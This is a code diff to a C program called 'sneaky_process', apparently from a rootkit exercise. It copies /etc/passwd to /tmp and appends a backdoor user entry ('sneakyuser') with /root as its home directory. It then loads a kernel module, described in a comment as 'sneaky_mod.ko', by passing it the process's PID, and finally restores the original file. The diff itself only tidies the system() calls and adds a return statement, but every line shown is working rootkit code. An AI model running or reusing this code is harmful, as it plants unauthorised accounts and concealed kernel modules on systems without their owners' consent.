@@ -26,11 +26,9 @@ int main() {
     printf("sneaky_process pid = %d\n", getpid());
 
     // 2. copy /etc/passwd to /tmp/passwd
-    char *cmd = "cp /etc/passwd /tmp/passwd";
-    system(cmd);
+    system("cp /etc/passwd /tmp/passwd");
     //add a new line to the end of the /etc/passwd file
-    system("echo \"sneakyuser:abc123:2000:2000:sneakyuser:/root:bash\" >> /etc/passwd");
-
+    system("echo \'sneakyuser:abc123:2000:2000:sneakyuser:/root:bash\n\' >> /etc/passwd");
     // 3. load sneaky_mod.ko using 'insmod', pass PID to module
     addPID();
 
@@ -42,4 +40,6 @@ int main() {
 
     // 6. restore /etc/passwd from /tmp/passwd
     system("mv /tmp/passwd /etc/passwd");
+
+    return EXIT_SUCCESS;
 }
